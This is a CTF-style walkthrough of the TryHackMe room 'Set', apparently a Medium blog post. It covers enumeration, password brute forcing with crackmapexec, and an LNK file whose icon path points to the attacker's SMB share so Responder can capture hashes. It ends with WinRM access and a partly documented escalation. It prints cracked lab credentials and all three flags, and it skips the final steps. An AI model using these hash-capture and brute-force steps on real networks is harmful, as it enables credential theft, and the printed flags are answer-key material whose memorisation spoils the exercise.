---
title: "Set TryHackme Walkthrough 056c690b7c19"
platform: Medium
original_file: 2024-08-27_Set-TryHackme-Walkthrough-056c690b7c19.md
---

# Set TryHackme Walkthrough 056c690b7c19

::: {}
# Set TryHackme Walkthrough {#set-tryhackme-walkthrough .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "Set"
:::

::::::: {.section .e-content field="body"}
:::::: {#0aef .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### Set TryHackme Walkthrough {#4119 .graf .graf--h3 .graf--leading .graf--title name="4119"}

**This is a Writeup of Tryhackme room "Set"**

<figure id="46ed" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*dvKy6x75zu3I2uTn.png"
class="graf-image" data-image-id="0*dvKy6x75zu3I2uTn.png"
data-width="403" data-height="226" data-is-featured="true" />
</figure>

**Room link:**
[https://tryhackme.com/room/set](https://tryhackme.com/room/set){.markup--anchor
.markup--p-anchor data-href="https://tryhackme.com/room/set"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is for Premium Members Only. who purchased THM premium
membership.**

Walkthrough --- SetStoryOnce again you find yourself on the internal
network of the Windcorp Corporation. This tasted so good last time you
were there, you came backfor more. However, they managed to secure the
Domain Controller this time, so you need to find another server and your
first scan discovered Set.

Set is used as a platform for developers and has had some problems in
the recent past. They had to reset a lot of users and restore backups
(maybe you were not the only hacker on their network?). So they decided
to make sure all users used proper passwords and closed of some of the
loose policies.

Can you still find a way in? Are some users more equal than others? Or
more sloppy? And maybe you need to think outside the box a little bit to
circumvent their new security controls...Happy Hacking! \@4nqr34z and
\@theart42Let's start with enumeration first.nmapEnum4linux reveals

Let's start with enumeration first

``` {#1335 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
nmap -p- -sC -sV 10.10.177.99
```

<figure id="6acb" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*BfKZ5HYbZTLCTP88.png"
class="graf-image" data-image-id="0*BfKZ5HYbZTLCTP88.png"
data-width="809" data-height="518" />
</figure>

We have three ports open, MSRPC, HTTPS, and SMB. The results also inform
us to add seth.windcorp.thm to our hosts file. There is also a Windows
Remote Management port open on 5985 and an additional MSRPC port on
49666. Lets first navigate to the website and then move on to SMB.

Add hostname=set.windcorp.thm to /etc/hosts

**HTTPS**\
Navigating to the homepage of the HTTPS site returns a company website

<figure id="f602" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*rrow0HC1v2btC3lQ.png"
class="graf-image" data-image-id="0*rrow0HC1v2btC3lQ.png"
data-width="875" data-height="480" />
</figure>

Directory Searching

``` {#4f97 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u https://set.windcorp.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

<figure id="2a66" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*6VGbE143ebBF0dll.png"
class="graf-image" data-image-id="0*6VGbE143ebBF0dll.png"
data-width="515" data-height="193" />
</figure>

``` {#35ed .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u https://set.windcorp.thm/assets -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

<figure id="adff" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*0vo3v4fZtO2C-_Cg.png"
class="graf-image" data-image-id="0*0vo3v4fZtO2C-_Cg.png"
data-width="549" data-height="217" />
</figure>

These appear to be directories that host the source code of the website,
we can snoop around these files in the debugger. Within the source code
of the website we can see a hidden section of testimonials with
usernames. The hint of the room suggested that they were previously
hacked therefore making those usernames valuable.

<figure id="3e15" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*-1F6HoOHBTfyqmMP.png"
class="graf-image" data-image-id="0*-1F6HoOHBTfyqmMP.png"
data-width="813" data-height="322" />
</figure>

Visit
view-source:[https://set.windcorp.thm/assets/data/users.xml](https://set.windcorp.thm/assets/data/users.xml){.markup--anchor
.markup--p-anchor
data-href="https://set.windcorp.thm/assets/data/users.xml"
rel="noopener ugc nofollow noopener" target="_blank"}

This file contains many usernames belonging to the company.

<figure id="3699" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*mszV3Ccr3Olu5hWm.png"
class="graf-image" data-image-id="0*mszV3Ccr3Olu5hWm.png"
data-width="677" data-height="424" />
</figure>

We can sort these to obtain only the username and brute force valid
accounts on the Set domain. The following command downloads the xml
file, extracts the usernames, deletes empty spaces and stores them in a
text file.

``` {#6aa3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="ruby"}
curl -k https://set.windcorp.thm/assets/data/users.xml -o user.xml
```

<figure id="3d4b" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*uuLQ1PGsUCmGMrKr.png"
class="graf-image" data-image-id="0*uuLQ1PGsUCmGMrKr.png"
data-width="837" data-height="171" />
</figure>

Extracting the usernames from users.xml file

``` {#2ba4 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
xmllint  --xpath "//row/email"  users.xml | sed -e 's/<email>//g' | sed -e 's/<\/email>//g' | sed -e 's/@windcorp.thm//g'>users.txt
```

<figure id="46eb" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*yzf-rVpMpcnvuyIC.png"
class="graf-image" data-image-id="0*yzf-rVpMpcnvuyIC.png"
data-width="362" data-height="279" />
</figure>

### SMB {#92a0 .graf .graf--h3 .graf-after--figure name="92a0"}

Using a quick smbclient scan reveals we need credentials to enumerate
SMB

<figure id="d906" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Y5Yug0vdP9PffRZF.png"
class="graf-image" data-image-id="0*Y5Yug0vdP9PffRZF.png"
data-width="489" data-height="143" />
</figure>

We can brute force valid accounts with the usernames we acquired from
the website with **crackmapexec** using the rockyou or common-SSH
passwords.

``` {#c996 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
crackmapexec smb set.windcorp.thm -u users.txt -p rockyou.txt
```

<figure id="3ba9" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*NjJCsXYx8QaCAQ_d.png"
class="graf-image" data-image-id="0*NjJCsXYx8QaCAQ_d.png"
data-width="875" data-height="220" />
</figure>

We can see the valid credentials are **myrtleowe**:**Passw@rd**

Listing the shares with the new found credentials

``` {#8f26 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="cpp"}
smbclient -L \\set.windcorp.thm -U myrtleowe
```

<figure id="9782" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*OG3zF_aiA6IlmgJG.png"
class="graf-image" data-image-id="0*OG3zF_aiA6IlmgJG.png"
data-width="568" data-height="277" />
</figure>

If we logon to the Files share we see the following.

<figure id="240f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*3emhjDjvdO7rVsrG.png"
class="graf-image" data-image-id="0*3emhjDjvdO7rVsrG.png"
data-width="790" data-height="249" />
</figure>

The Info.txt file is the first flag of the room. We do not yet have
access for evil-winrm

<figure id="80ae" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*w_A3CTOTQ5U_1MMI.png"
class="graf-image" data-image-id="0*w_A3CTOTQ5U_1MMI.png"
data-width="674" data-height="278" />
</figure>

**Flag1: THM{4c66e2b8d4c45a65e6a7d0c7ad4a5d7ff245dc14}**

We are counting on someone unzipping the files, because it says they
will review them.Not too commonly known, you can change the icon-path in
a LNK-file and point it to a SMB-server capturing the users
password-hash

The beauty with this trick, is that the user don't even has to click the
lnk. Opening a window displaying contents of a folder containing such a
file, is enough. First we create our lnk, using this excellent tool.
[http://www.mamachine.org/mslink/index.en.html](http://www.mamachine.org/mslink/index.en.htm){.markup--anchor
.markup--p-anchor
data-href="http://www.mamachine.org/mslink/index.en.htm"
rel="noopener ugc nofollow noopener" target="_blank"}

**Note**: Due to some reason i deploy my machine again

machine ip = 10.10.169.112

``` {#058a .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
./mslink_v1.3.sh -l notimportant -n shortcut -i \\\\10.2.12.26\\MichelleWat -o shortcut.lnkzip myfile.zip shortcut.lnk
```

<figure id="7b31" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*TmjjGEdS-UDl3gFY.png"
class="graf-image" data-image-id="0*TmjjGEdS-UDl3gFY.png"
data-width="875" data-height="143" />
</figure>

### Start Responder {#13a2 .graf .graf--h3 .graf-after--figure name="13a2"}

``` {#f28d .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="css"}
responder -I tun0
```

Uploading file to share

<figure id="72b5" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*sluMutm_2VBDpee1.png"
class="graf-image" data-image-id="0*sluMutm_2VBDpee1.png"
data-width="716" data-height="146" />
</figure>

Search 10.10.169.112 (Machine ip) in browser

<figure id="aa46" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CGmr1_QRfa08t1cG.png"
class="graf-image" data-image-id="0*CGmr1_QRfa08t1cG.png"
data-width="875" data-height="198" />
</figure>

yess we got hash

Now crack this hash for user **MichelleWat**

<figure id="0bed" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Ok7nRuUu62mAvg_Q.png"
class="graf-image" data-image-id="0*Ok7nRuUu62mAvg_Q.png"
data-width="700" data-height="238" />
</figure>

**User:** MichelleWat

**Password: **!!!MICKEYmouse

We try WinRM and this time we are in luck, Install evil-winrm tool

``` {#0f58 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
gem install evil-winrm
```

<figure id="4b7f" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*_wL6t2jlizxRazT9.png"
class="graf-image" data-image-id="0*_wL6t2jlizxRazT9.png"
data-width="737" data-height="199" />
</figure>

<figure id="082d" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*n88sr6wmTzQiaYb2.png"
class="graf-image" data-image-id="0*n88sr6wmTzQiaYb2.png"
data-width="654" data-height="343" />
</figure>

And Here We got

**Flag 2 THM{690798b1780964f5f51cebd854da5a2ea236ebb5}**

We spot a listening port we didn't see from the outside

<figure id="4506" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*LnsUX9LNHlapf3uY.png"
class="graf-image" data-image-id="0*LnsUX9LNHlapf3uY.png"
data-width="786" data-height="531" />
</figure>

Let's investigate the identified process sitting on the **PID 4736**. It
happens that you forget a command syntax (it occurs to me quite often).
The PowerShell Get-Help command does the job.

get-process

<figure id="1e06" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*xMxyvEQOCYLBxUa2.png"
class="graf-image" data-image-id="0*xMxyvEQOCYLBxUa2.png"
data-width="837" data-height="168" />
</figure>

listening to 2805A bit more research reveals there could be a serious
vulnerability using .Net Deserialization

<figure id="8f6d" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*B0vwtIlsQYzK9Bl-.png"
class="graf-image" data-image-id="0*B0vwtIlsQYzK9Bl-.png"
data-width="875" data-height="345" />
</figure>

[https://www.veeam.com/kb3144](https://www.veeam.com/kb3144){.markup--anchor
.markup--p-anchor data-href="https://www.veeam.com/kb3144"
rel="noopener ugc nofollow noopener" target="_blank"}

<figure id="47b0" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*32vBZowDxc7pI8Vk.png"
class="graf-image" data-image-id="0*32vBZowDxc7pI8Vk.png"
data-width="875" data-height="74" />
</figure>

And the version looks really promising indeed!So. We need to get to that
port. Port-forwarding user msf? Trying uploading a meterpreter.

We start with uploading plink.exe, one of the command line SSH tools for
Windows. Make sure you use the new version!

**Downloading *plink.exe:***

Assuming that we don't have plink.exe on our Windows Machine, let's
browse to
[https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html){.markup--anchor
.markup--p-anchor
data-href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html"
rel="noopener ugc nofollow noopener" target="_blank"} and download the
file:

There are two binaries available; as you can guess, 32-bit and 64-bit
(There are also ARM architecture executables for Windows, if you scroll
down)

<figure id="0360" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*asR5LmjM_UidpicS.png"
class="graf-image" data-image-id="0*asR5LmjM_UidpicS.png"
data-width="720" data-height="240" />
</figure>

upload plink.exe to deployed machine

``` {#0baf .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="typescript"}
python -m SimpleHTTPServer 80
```

Due to my tryhackme subscription expire i couldn't explore my writeup

So here is

**Flag3 : THM{934f7faaadab3b040edab8214789114c9d3049dd}**

### Promote and Collaborate on Cybersecurity Insights {#c545 .graf .graf--h3 .graf-after--p name="c545"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#7ba8 .graf .graf--h3 .graf-after--p name="7ba8"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 27, 2024](https://medium.com/p/056c690b7c19).

[Canonical
link](https://medium.com/@bevijaygupta/set-tryhackme-walkthrough-056c690b7c19){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
